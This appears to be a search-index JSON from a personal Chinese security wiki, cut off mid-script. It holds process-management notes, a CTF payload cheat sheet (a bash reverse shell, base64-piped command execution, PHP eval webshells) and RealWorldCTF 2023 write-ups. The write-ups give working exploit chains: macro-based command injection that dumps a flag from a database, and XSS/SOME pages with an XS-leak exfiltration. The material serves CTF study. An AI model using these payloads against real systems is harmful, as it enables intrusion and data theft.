{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"BRIdGE's wiki","text":"<p>\u8fd8\u5728\u65bd\u5de5</p>"},{"location":"#about","title":"About","text":"<p>\u6700\u8ba8\u538c\u81ea\u6211\u4ecb\u7ecd\u4e86ww\uff0c\u4e0d\u5199\u4e86\u3002</p>"},{"location":"Misc/nonebot/","title":"nonebot","text":""},{"location":"Misc/nonebot/#_1","title":"\u6740\u6b7b\u8fdb\u7a0b","text":"<p>\u5bfb\u627e\u8fdb\u7a0b</p> <pre><code>ps -aux | grep go-cqhttp\n</code></pre> <p>\u7b2c\u4e00\u4e2a\u6570\u5b57\u662fpid</p> <p>\u7136\u540e</p> <pre><code>kill -9 pid\n</code></pre> <p>\u6ce8\u610f\u6740nonebot\u7684\u65f6\u5019\u9700\u8981</p> <pre><code>ps -aux | grep python3\n</code></pre> <p>\u7136\u540e\u8fd9\u4e24\u4e2a\u5c31\u662f</p> <pre><code>root      650674  0.0  0.0  17512 11148 ?        S    Dec03   0:00 /usr/bin/python3 -c from multiprocessing.resource_tracker import main;main(4)\nroot      650675  0.3  0.7 546092 116080 ?       Sl   Dec03  13:17 /usr/bin/python3 -c from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe_handle=7) --multiprocessing-fork\n</code></pre>"},{"location":"Misc/nonebot/#_2","title":"\u540e\u53f0\u8fd0\u884c","text":"<p>nohup without output</p> <pre><code>nohup command &gt;/dev/null 2&gt;&amp;1 &amp;\n</code></pre> <p>nohup nb run&gt;/dev/null 2&gt;&amp;1 &amp;</p> <p>nohup ./go-cqhttp&gt;/dev/null 2&gt;&amp;1 &amp;</p>"},{"location":"Web%E5%AE%89%E5%85%A8/","title":"Web\u5b89\u5168","text":"<p>\u5b66Web\u6ca1\u524d\u9014\uff0c\u522b\u770b\u4e86</p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/","title":"HTTP\u8bf7\u6c42\u8d70\u79c1","text":""},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#keep-alive","title":"keep-alive","text":"<p>TCP\u63e1\u624b\u540e\u76f4\u63a5\u53d1\u9001\u8bf7\u6c42\uff0c\u4e0d\u9700\u8981\u91cd\u65b0\u63e1\u624b\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#transfer-encoding","title":"Transfer-Encoding","text":"<pre><code>HTTP/1.1 200 OK\nContent-Type: text/plain\nTransfer-Encoding: chunked\n\n7\\r\\n\nMozilla\\r\\n\n11\\r\\n\nDeveloper Network\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre> <p>\u7b2c\u4e00\u884c\u662f16\u8fdb\u5236\uff0c\u672b\u5c3e\u7684<code>\\r\\n</code>\u4e0d\u7b97</p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#content-length","title":"Content-Length","text":"<p>body\u7684\u5b57\u8282\u6570\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/#_1","title":"\u5404\u79cd\u6a21\u5f0f \u53ef\u4ee5\u53c2\u8003","text":"<p>https://tttang.com/archive/1808</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/","title":"\u5e38\u7528payload","text":""},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#java-exec","title":"java exec","text":"<pre><code>bash -c {echo,xxx}|{base64,-d}|{bash,-i}\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#base64","title":"base64 \u547d\u4ee4\u6267\u884c","text":"<pre><code>echo xxx|base64 -d|bash\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#linuxshell","title":"linux\u53cd\u5f39shell","text":"<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1'\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#php","title":"php\u4e00\u53e5\u8bdd\u6728\u9a6c","text":"<pre><code>&lt;?php eval($_GET[\"1\"]); ?&gt;\n&lt;?php eval($_POST[\"1\"]); ?&gt;\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#suid","title":"SUID\u641c\u7d22","text":"<p><code>find / user root -perm -4000 -print 2&gt;/dev/null</code></p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#r","title":"\u53bb\u6389\\r","text":"<pre><code>tr -d '\\r' &lt; a.sh &gt; b.sh\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%B8%B8%E7%94%A8payload/#nginx","title":"nginx\u76ee\u5f55","text":"<pre><code>/var/www/html/\n</code></pre> <p>config</p> <pre><code>/etc/nginx/sites-enabled/\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/etc/RWCTF_ASTLIBRA/","title":"RWCTF ASTLIBRA","text":"<p>\u73af\u5883\u548c\u5b98\u65b9wp</p> <p>https://github.com/wupco/rwctf2023-ASTLIBRA</p> <p>\u5f53\u524d\u7aef\u5411/api.php\u53d1\u8d77\u8bf7\u6c42\u7684\u65f6\u5019\uff0capi.php\u6839\u636e\u63a5\u6536\u5230\u7684URL\u53c2\u6570\u548c\u7528\u6237\u540d\u7b49\u4fe1\u606f\uff0c\u62fc\u63a5\u51fa\u4e00\u6bb5\u4ee3\u7801</p> <pre><code>$tmpl = &lt;&lt;&lt;ZEPF\nnamespace {namespace};\nclass {class}{\n    public function getURL(){\n        return \"{base64url}\";\n    }\n    public function test(){\n        var ch = curl_init();\n        curl_setopt(ch, CURLOPT_URL, \"{url}\");\n        curl_setopt(ch, CURLOPT_HEADER, 0);\n        curl_exec(ch);\n        curl_close(ch);\n        return true;\n    }\n}\nZEPF;\n</code></pre> <p></p> <p>\u7136\u540e\u5c31\u4f1a\u628a\u8fd9\u6bb5\u4ee3\u7801\u63d2\u5165\u6570\u636e\u5e93\u4e2d\uff0c\u5e76\u6807\u8bb0check=0\uff0c\u5728config.php#wait_for_result\u6b7b\u5faa\u73af\uff0c\u76f4\u5230check=1\u624d\u8df3\u5faa\u73af\u3002</p> <p>\u800cbot.php\u6709\u4e00\u4e2a\u6b7b\u5faa\u73af\u4efb\u52a1\uff0c\u4f1a\u67e5\u627e\u6570\u636e\u5e93\u4e2dcheck=1\u7684\u8bb0\u5f55\uff0c\u5c06\u5176select\u51fa\u6765\uff0c\u7528zephir\u7f16\u8bd1\u8fd0\u884c\u8fd4\u56de\u8bbf\u95eeURL\u7684\u7ed3\u679c\uff0c\u7136\u540e\u628acheck\u6539\u62101\uff0c\u4ece\u800cconfig.php\u8df3\u51fa\u5faa\u73af\u5728api.php\u8fd4\u56de\u7ed3\u679c</p> <p>\u8fd9\u6bb5\u4ee3\u7801\u5728\u6570\u636e\u5e93\u4e2d\u53ef\u4ee5\u770b\u5230</p> <p></p> <p>\u770b\u4e86\u4e00\u4e0b\uff0c\u6ce8\u5165\u70b9\u57fa\u672c\u4e0a\u53ea\u6709URL\u53ef\u63a7\uff0c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\u3002\u4f46\u662f\u6700\u540e\u5728\u7f16\u8bd1\u8fd0\u884c\u7684\u65f6\u5019\u4f1a\u5148check\u4e00\u904dURL\u3002</p> <p>url\u4f1a\u7ecf\u8fc7\u5904\u7406</p> <p><code>$url = addslashes($_POST['URL']);</code> </p> <p><code>preg_replace('/(.*)\\{url\\}(.*)/is', '${1}'.$url.'${2}', $zep_file);</code></p> <p>PHP\u6b63\u5219\u8868\u8fbe\u5f0f\u7684<code>${n}</code>\u8868\u793a\u7b2cn\u4e2a\u5c0f\u62ec\u53f7\u8868\u8fbe\u5f0f\u5339\u914d\u51fa\u6765\u7684\u5185\u5bb9\u3002\u6240\u4ee5\u53ef\u4ee5\u5728URL\u672b\u5c3e\u52a0\u4e00\u4e2a${2}\uff0c\u6700\u540e\u6ce8\u91ca\uff0c\u9003\u9038\u5f15\u53f7\u3002code\u5219\u4f1a\u88ab\u63d2\u5165\u5230class\u540e\u9762\u7684\u90e8\u5206\u3002</p> <pre><code>URL=http%3a//www.baidu.com/${2}code/*\n</code></pre> <p>\u5f53\u7136\uff0c\u9884\u671f\u89e3\u7528\u4e86\u4e00\u4e2a\u9006\u5929\u7684PHP\u7279\u6027(?)</p> <p>https://stackoverflow.com/questions/50983530/why-is-preg-replace-removing-backslashes</p> <p>\u4e8e\u662f\u4e5f\u5c31\u6709\u4e86\u5b98\u65b9wp\u4e2d\u7684</p> <p><code>\\\"</code> will finally convert to <code>\\\\\"</code></p> <p>\u9003\u51fa\u6765\u4e4b\u540e\uff0c\u5c31\u53ef\u4ee5\u5199\u4ee3\u7801\u4e86\u3002\u6b63\u5e38\u7684php\u7b97\u662f\u5199\u4e0d\u4e86\u4e86\uff0c\u5728bot.php\u91cc\u8fc7\u6ee4\u4e861mol\u4e1c\u897f\u3002\u4f46\u662fzephir\u652f\u6301\u539f\u751fcblock\u3002\u5b98\u65b9wp\u4e2d\u8bf4\u5230</p> <p>Although cblock has been removed by <code>ASTLIBRA/zephir-tunnel/secure.patch</code>, it could still be inserted in the place out of the function scope.</p> <p>\u89c2\u5bdf\u4e00\u4e0b\u6b63\u5e38\u9884\u7f16\u8bd1\u540e\u7684C\u7ed3\u6784</p> <pre><code>#ifdef HAVE_CONFIG_H\n#include \"../ext_config.h\"\n#endif\n#include &lt;php.h&gt;\n#include \"../php_ext.h\"\n#include \"../ext.h\"\n#include &lt;Zend/zend_operators.h&gt;\n#include &lt;Zend/zend_exceptions.h&gt;\n#include &lt;Zend/zend_interfaces.h&gt;\n#include \"kernel/main.h\"\n#include \"kernel/object.h\"\n#include \"kernel/fcall.h\"\n#include \"kernel/memory.h\"\nZEPHIR_INIT_CLASS(Hack_exp)\n{\nZEPHIR_REGISTER_CLASS(Hack, exp, hack, exp, hack_exp_method_entry, 0);\nreturn SUCCESS;\n}\nPHP_METHOD(Hack_exp, getURL)\n{\nzval *this_ptr = getThis();\nRETURN_STRING(\"base64\");\n}\nPHP_METHOD(Hack_exp, test)\n{\nzval ch, _0, _1, _3;\nzephir_method_globals *ZEPHIR_METHOD_GLOBALS_PTR = NULL;\nzephir_fcall_cache_entry *_2 = NULL;\nzend_long ZEPHIR_LAST_CALL_STATUS;\nzval *this_ptr = getThis();\nZVAL_UNDEF(&amp;ch);\nZVAL_UNDEF(&amp;_0);\nZVAL_UNDEF(&amp;_1);\nZVAL_UNDEF(&amp;_3);\nZEPHIR_MM_GROW();\nZEPHIR_CALL_FUNCTION(&amp;ch, \"curl_init\", NULL, 1);\nzephir_check_call_status();\nZVAL_LONG(&amp;_0, 10002);\nZEPHIR_INIT_VAR(&amp;_1);\nZVAL_STRING(&amp;_1, \"localhost\");\nZEPHIR_CALL_FUNCTION(NULL, \"curl_setopt\", &amp;_2, 2, &amp;ch, &amp;_0, &amp;_1);\nzephir_check_call_status();\nZVAL_LONG(&amp;_0, 42);\nZVAL_LONG(&amp;_3, 0);\nZEPHIR_CALL_FUNCTION(NULL, \"curl_setopt\", &amp;_2, 2, &amp;ch, &amp;_0, &amp;_3);\nzephir_check_call_status();\nZEPHIR_CALL_FUNCTION(NULL, \"curl_exec\", NULL, 3, &amp;ch);\nzephir_check_call_status();\nZEPHIR_CALL_FUNCTION(NULL, \"curl_close\", NULL, 4, &amp;ch);\nzephir_check_call_status();\nRETURN_MM_BOOL(1);\n}\n</code></pre> <p>\u7531\u4e8e\u540e\u7eed\u6d41\u7a0b\u4f1a\u8c03\u7528<code>getURL</code>\u51fd\u6570\uff0c\u6240\u4ee5\u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a\u5b8f\u52ab\u6301<code>RETURN_STRING</code>\u6765\u6267\u884c\u547d\u4ee4\u3002</p> <p>\u53e6\u5916\uff0c\u7531\u4e8e\u5f15\u53f7\u4f1a\u88ab<code>addslashes</code>\u5904\u7406\uff0c\u4e0d\u80fd\u76f4\u63a5\u5b9a\u4e49\u4e00\u4e2a\u5b57\u7b26\u4e32\u5e38\u91cf\u3002\u8fd9\u91cc\u7528\u5230\u4e86\u4e00\u4e9bC\u8bed\u8a00\u51fd\u6570\u5b8f\u7684\u7279\u6027\u3002#s\u4f1a\u76f4\u63a5\u8fd4\u56de\u5b8f\u53d8\u91cf\u540d\u3002</p> <pre><code>%{\n#define CMD echo xxx|base64 -d|bash\n#define GET(cmd) STR(cmd)\n#define STR(s) #s\n#define RETURN_STRING(s) system(GET(CMD))\n}%\n</code></pre> <p>\u6267\u884c\u547d\u4ee4\u53cd\u5f39shell\u540e\uff0c\u5199\u4e00\u4e2aphp\u811a\u672c\u8fde\u63a5\u6570\u636e\u5e93\u5c31\u53ef\u4ee5select\u51fa\u6570\u636e\u5e93\u91cc\u7684flag\u4e86\u3002\u6700\u7ec8EXP\uff1a</p> <p>POST /api.php</p> <pre><code>URL=http%3a//www.baidu.com/${2}%25{\n%23define+CMD+echo+xxx|base64+-d|bash\n%23define+GET(cmd)+STR(cmd)\n%23define+STR(s)+%23s\n%23define+RETURN_STRING(s)+system(GET(CMD))\n}%25/*\n</code></pre> <p>\u6267\u884c\u547d\u4ee4</p> <p><code>echo PD9waHAKJGhvc3QgPSAnZGInOwokdXNlcm5hbWUgPSAncm9vdCc7CiRwYXNzd29yZCA9ICdyZWFsd29ybGRjdGYnOwokZGF0YWJhc2UgPSAnd2ViJzsKJGRiYyA9IG15c3FsaV9jb25uZWN0KCRob3N0LCAkdXNlcm5hbWUsICRwYXNzd29yZCwgJGRhdGFiYXNlKTsKCiRxdWVyeSA9ICJzZWxlY3QgZmxhZyBmcm9tIGZsYWciOwp2YXJfZHVtcCgKICAgICRkYmMgLT4gcXVlcnkoJHF1ZXJ5KS0+ZmV0Y2hfYXNzb2MoKQopOwo=|base64 -d&gt;/tmp/flag.php&amp;&amp;php /tmp/flag.php&amp;&amp;rm /tmp/flag.php</code></p> <p></p> <p>\u53e6\u5916\uff0c\u7531\u4e8ecurl\u5df2\u7ecf\u53ef\u4ee5\u8fbe\u5230SSRF\u8fde\u6570\u636e\u5e93\u7684\u6548\u679c\uff0c\u6240\u4ee5\u4e5f\u4e0d\u4e00\u5b9a\u8981\u547d\u4ee4\u6267\u884c\uff0c\u5229\u7528\u6ca1\u6709\u88abban\u7684php-curl\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fd4\u56deflag\u3002\u5177\u4f53\u53c2\u89c1\u5b98\u65b9wp\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/","title":"RWCTF2023 The Cult of 8bit","text":"<p>\u9898\u76ee\u6a21\u62df\u4e86\u4e00\u4e2a\u535a\u5ba2\u7f51\u7ad9\uff0c\u7528\u6237\u53ef\u4ee5\u6dfb\u52a0post\u548ctodo</p> <p></p> <p>XSS BOT\u53ef\u4ee5\u8bbf\u95ee\u4efb\u610fURL\u3002</p> <p>flag\u5728admin\u53d1\u7684\u4e00\u7bc7post\u91cc\uff0c\u4e5f\u5c31\u662f\u8bf4\u5176id\u4f1a\u5728home\u9875\u9762\u4f1a\u663e\u793a\u3002</p> <p>\u6240\u4ee5\u5e94\u8be5\u901a\u8fc7\u9898\u76ee\u81ea\u5e26\u7684\u4e00\u4e9bXSS\u70b9\uff0c\u5728home\u9875\u9762XSS\u628a\u6570\u636e\u5e26\u51fa\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#home1click-xss","title":"Home\u9875\u97621click XSS","text":"<p>home\u9875\u9762\u7684todo list\u662f\u7528ejs\u6e32\u67d3\u7684\uff0c\u5982\u679ctodo\u662furl\u7684\u8bdd\u4f1a\u6e32\u67d3\u4e3aa\u6807\u7b7e\u3002</p> <p>\u540e\u7aef\u903b\u8f91</p> <pre><code>let isURL = false;\ntry {\nnew URL(text); // errors if not valid URL\nisURL = !text.toLowerCase().trim().startsWith(\"javascript:\"); // no\n} catch {}\n</code></pre> <p>home.ejs</p> <pre><code>&lt;%_ user.todos.forEach(todo =&gt; { _%&gt;\n&lt;%_ if (todo.isURL) { _%&gt;\n&lt;li class=\"has-text-left\"&gt;&lt;a target=\"_blank\" href=&lt;%= todo.text %&gt;&gt;&lt;%= todo.text %&gt;&lt;/a&gt;&lt;/li&gt;\n&lt;%_ } else { _%&gt;\n&lt;li class=\"has-text-left\"&gt;&lt;%= todo.text %&gt;&lt;/li&gt;\n&lt;%_ } _%&gt;\n&lt;%_ }); _%&gt;\n</code></pre> <p>\u5b58\u5728\u5f88\u660e\u663e\u7684\u62fc\u63a5\uff0c\u6784\u9020\u5982\u4e0btodo\u5c31\u80fd1click XSS</p> <p><code>http://127.0.0.1:12345? onclick=alert()</code></p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#postxss","title":"POST\u9875\u9762\u53cd\u5c04\u578bXSS","text":"<p>POST\u9875\u9762\u5b58\u5728\u4e00\u4e2aJSONP\u673a\u5236\u3002</p> <p>\u524d\u7aef\uff1a</p> <pre><code>const POST_SERVER = \"\";\nconst $ = document.querySelector.bind(document); // imagine using jQuery...\nfunction load_post(post) {\nif (!post.success) {\n$(\"#post-name\").innerText = \"Error\";\n$(\"#post-body\").innerText = post.error;\nreturn;\n}\n$(\"#post-name\").innerText = post.name;\n$(\"#post-body\").innerText = post.body;\n}\nwindow.onload = function() {\nconst id = new URLSearchParams(window.location.search).get('id');\nif (!id) {\nreturn;\n}\n// Load post from POST_SERVER\n// Since POST_SERVER might be a different origin, this also supports loading data through JSONP\nconst request = new XMLHttpRequest();\ntry {\nrequest.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false);\nrequest.send(null);\n}\ncatch (err) { // POST_SERVER is on another origin, so let's use JSONP\nlet script = document.createElement(\"script\");\nscript.src = `${POST_SERVER}/api/post/${id}?callback=load_post`;\ndocument.head.appendChild(script);\nreturn;\n}\nload_post(JSON.parse(request.responseText));\n}\n</code></pre> <p>\u540e\u7aef</p> <pre><code>router.get(\"/post/:id\", (req, res) =&gt; {\nlet { id } = req.params;\nif (!id || typeof id !== \"string\") {\nreturn res.jsonp({\nsuccess: false,\nerror: \"Missing id\"\n});\n}\nif (!db.posts.has(id)) {\nreturn res.jsonp({\nsuccess: false,\nerror: \"No post found with that id\"\n});\n}\nlet post = db.posts.get(id);\nreturn res.jsonp({\nsuccess: true,\nname: post.name,\nbody: post.body\n});\n});\n</code></pre> <p>\u7531\u4e8eJSONP\u7684\u673a\u5236\uff0c\u540e\u7aef\u4f1a\u53d6\u51facallback\u53c2\u6570\uff0c\u62fc\u63a5\u51fajs\u4ee3\u7801\u8fd4\u56de\u7ed9\u524d\u7aef\u3002\u6548\u679c\u5982\u4e0b</p> <p></p> <p>\u5f53URL\u4e3a</p> <p><code>http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5? callback=alert%23%00</code></p> <p>\u7684\u65f6\u5019\uff0c\u7531\u4e8eURL\u5305\u542b<code>%00</code>\u4f1a\u8fdb\u5165catch\uff0c\u7136\u540e<code>%23</code>\u4e3a<code>#</code>\uff0c\u540e\u9762\u7684callback\u4f1a\u88ab\u5f53\u4f5canchor\u89e3\u6790\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63a7\u5236\u4efb\u610fcallback\u4e86\u3002\u6ce8\u610f\u8fd9\u91cc\u53c2\u6570\u662f\u4e0d\u53ef\u63a7\u7684\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#some-attack","title":"SOME ATTACK","text":"<p>\u8fd9\u91cc\u8981\u4ecb\u7ecd\u672c\u9898\u7528\u5230\u7684\u91cd\u8981\u65b9\u6cd5--SOME ATTACK\u3002</p> <p>https://www.someattack.com/Playground/About</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u5982\u679c\u9875\u9762a\u548c\u9875\u9762b\u540c\u6e90\uff0cb\u5b58\u5728xss\uff0c\u53d7\u5bb3\u8005\u8bbf\u95ee\u6076\u610f\u7684c\u7f51\u7ad9\uff0c\u90a3\u4e48\u5c31\u80fd\u5728a\u9875\u9762xss\u3002</p>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#solution1-cookiestoredelete","title":"Solution1: cookieStore.delete","text":"<p>Home\u9875\u9762\u7684click\u53ef\u4ee5\u901a\u8fc7POST\u9875\u9762\u8bbe\u7f6ecallback\u4e3a<code>opener.document.links[4].click</code>\u5b8c\u6210\u70b9\u51fb\u3002\u6240\u4ee5\u9700\u8981\u8ba9BOT\u767b\u5f55\u6211\u4eec\u81ea\u5df1\u7684\u8d26\u53f7\uff0c\u8fd9\u4e2a\u8d26\u53f7\u5305\u542b\u4e00\u4e2aXSS todo\u3002\u4f46\u662f\u8fd9\u5c31\u6d89\u53ca\u5230\u9898\u76ee\u8bbe\u7f6e\u7684<code>csrf</code>\u673a\u5236\u3002\u5ba1\u8ba1\u4ee3\u7801\u53ef\u4ee5\u53d1\u73b0\u767b\u5f55\u767b\u51fa\u7b49\u64cd\u4f5c\u9700\u8981\u4f1a\u6839\u636e\u6bd4\u8f83cookie\u7684<code>_csrf</code>\u548c\u8bf7\u6c42\u53c2\u6570<code>_csrf</code>\u6bd4\u8f83\u3002\u5f53cookie\u91cc<code>_csrf</code>\u4e3a\u7a7a\u7684\u65f6\u5019\u8bf7\u6c42\u53c2\u6570<code>_csrf</code>\u4e3a\u7a7a\u7684\u8bdd\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8fd9\u4e2a\u673a\u5236\u3002</p> <p><code>cookieStore.delete</code>\u51fd\u6570\u521a\u597d\u53ef\u4ee5\u5728POST\u9875\u9762\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u5176\u6b63\u597d\u6709\u4e00\u4e2a\u53c2\u6570<code>name</code></p> <pre><code>name\n</code></pre> <p>A string with the name of a cookie.</p> <p>\u800cname\u5c31\u662f\u53ef\u63a7\u7684\u7528\u6237\u540d\u3002</p> <p>\u8be5\u89e3\u6cd5\u5927\u81f4\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>BOT\u8bbf\u95ee\u53ef\u63a7\u7684a.html</li> <li>a.html\u63a7\u5236\u8df3\u8f6c\u5230admin home\uff0c\u7136\u540e\u6253\u5f00\u65b0\u7a97\u53e3b.html</li> <li> <p>b.html\u9700\u8981\u505a\u7684\u4e8b\u60c5\uff1a</p> <p>\u200b   3.1 cookieStore.delete\u5220\u9664_csrf</p> <p>\u200b   3.2 logout</p> <p>\u200b   3.3 cookieStore.delete\u5220\u9664_csrf</p> <p>\u200b   3.4 \u7528form\u6765\u767b\u5f55\u4e8b\u5148\u51c6\u5907\u597d\u7684\u7528\u6237evil</p> <p>\u200b   3.5 \u6253\u5f00evil home\uff0c\u7136\u540e\u6253\u5f00\u65b0\u7a97\u53e3c.html</p> </li> <li> <p>c.html\u901a\u8fc7<code>opener.document.links[N].click</code>\u5b8c\u6210SOME ATTACK\uff0c\u5728evil home\u70b9\u51fbXSS a tag</p> </li> <li>XSS a tag\u7528opener\u5f80\u524d\u627e\uff0c\u628a<code>admin home</code>\u7684\u6570\u636e\u5916\u5e26</li> </ol> <p>\u4ee5\u4e0b\u662fSndav\u795e\u7684EXP</p> <p>a.html</p> <pre><code>&lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\nconst main = async () =&gt; {\nopen(\"b.html\")\nlocation.replace(\"http://127.0.0.1:12345\");\n}\nmain();\n&lt;/script&gt;\n</code></pre> <p>b.html</p> <pre><code>&lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\nconst main = async () =&gt; {\nPAYLOAD = `cookieStore.delete`;\nt = open(`http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5?\ncallback=${PAYLOAD}%23%00`);\nawait sleep(1000);\nt.close();\nt = open(\"http://127.0.0.1:12345/api/logout\");\nawait sleep(1000);\nt.close()\nPAYLOAD = `cookieStore.delete`;\nt = open(`http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5?\ncallback=${PAYLOAD}%23%00`);\nawait sleep(1000);\nt.close();\nt = open(\"login.html\")\nawait sleep(1000);\nt.close();\nopen(\"c.html\")\n}\nmain();\n&lt;/script&gt;\n</code></pre> <p>login.html</p> <pre><code>&lt;body&gt;\n&lt;form action=\"http://127.0.0.1:12345/api/login\" method=\"POST\"&gt;\n&lt;input class=\"input\" type=\"text\" placeholder=\"Username\" name=\"user\"\nvalue=\"sndav2\"/&gt;\n&lt;input class=\"input\" type=\"password\" placeholder=\"Password\" name=\"pass\"\nvalue=\"12345678\"/&gt;\n&lt;input type=\"submit\" value=\"Login\"/&gt;\n&lt;/form&gt;\n&lt;/body&gt;\n&lt;script&gt;\ndocument.forms[0].submit();\n&lt;/script&gt;\n</code></pre> <p>c.html</p> <pre><code>&lt;script&gt;\nPAYLOAD = `opener.document.links[4].click`;\nt = open(`http://127.0.0.1:12345/post/?id=bfe43284-77fe-4256-8295-f5915b35fcd5?\ncallback=${PAYLOAD}%23%00`);\nlocation.replace(\"http://127.0.0.1:12345\");\n&lt;/script&gt;\n</code></pre>"},{"location":"Web%E5%AE%89%E5%85%A8/CTF/Write-Ups%26%E5%A4%8D%E7%8E%B0/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/RWCTF_The%20Cult%20of%208bit/#solution2-focus-xsleaks","title":"Solution2: focus + XSleaks","text":"<p>\u53e6\u4e00\u79cd\u89e3\u6cd5\u662f\u5229\u7528\u4e86focus\u8fd9\u4e2a\u65e0\u53c2\u51fd\u6570\u7ed9iframe\u6253\u4e0a\u6807\u8bb0\uff0ciframe\u7684\u4f5c\u7528\u662f\u7528\u4e8eXSleaks\u3002</p> <p>\u6b65\u9aa4\u5982\u4e0b\uff1a</p> <ol> <li>BOT\u8bbf\u95eea.html</li> <li>a.html\u63a7\u5236\u8df3\u8f6c\u5230admin home\uff0c\u7136\u540e\u6253\u5f00\u65b0\u7a97\u53e3b.html</li> <li>b.html\u8bbe\u7f6e\u4e00\u4e9biframe\uff0c\u6bcf\u4e2aiframe\u5bf9\u5e94\u4e00\u4e2a\u5b57\u5178\u5143\u7d20\uff0c\u5e76\u5b9e\u65f6\u8bb0\u5f55iframe\u7684focus\u60c5\u51b5\u3002\u7136\u540e\u8df3\u8f6c\u5230c.html</li> <li>c.html\u6253\u5f00d.html</li> <li>d.html\u5229\u7528opener\u5b9a\u4f4d\u5230admin home flag href\u7684\u7b2ci\u4f4d\uff0c\u5e76\u901a\u8fc7c.html\u89e6\u53d1focus\u5728b.html\u5bf9\u5e94\u7684iframe\u505a\u6807\u8bb0</li> </ol> <p>\u4ee5\u4e0b\u662fsh1yo\u5e08\u5085\u7684EXP:</p> <p>a.html</p> <pre><code>&lt;script&gt;\nb = open(`/b.html`);\nlocation.replace(\"http://localhost:12345/\");\n&lt;/script&gt;\n</code></pre> <p>b.html</p> <pre><code>&lt;body&gt;\n&lt;a id=focusme href=#&gt;sth&lt;/a&gt;\n&lt;script&gt;\nconst sleep = d =&gt; new Promise(r =&gt; setTimeout(r, d));\nalphabet = \"0123456789abcdef-\"\n//create iframes\nfor (var i = 0; i &lt; alphabet.length; i++) {\niframe = document.createElement(\"iframe\");\niframe.name = alphabet[i];\niframe.src = \"http://localhost:12345/\";\ndocument.body.appendChild(iframe);\n}\n//array for found characters\nhovered = []\nconst main = async () =&gt; {\n// every 0.075 secs check for iframes' onfucus event\nsetInterval(() =&gt; {\np = document.activeElement.name\nif (p) {\n// if there's focus on an iframe -- add its character to hovered and change the focus\nhovered.push(p);\ndocument.getElementById(\"focusme\").focus();\n}\n}, 75)\nawait sleep(2000);\nc = open(`/c.html`);\nawait sleep(2000 + 150);\n// every 500 secs send found characters to our server endpoint /ret/:characters\nsetInterval(() =&gt; {\nfetch(`/ret/${hovered.join(\"\")}`)\n}, 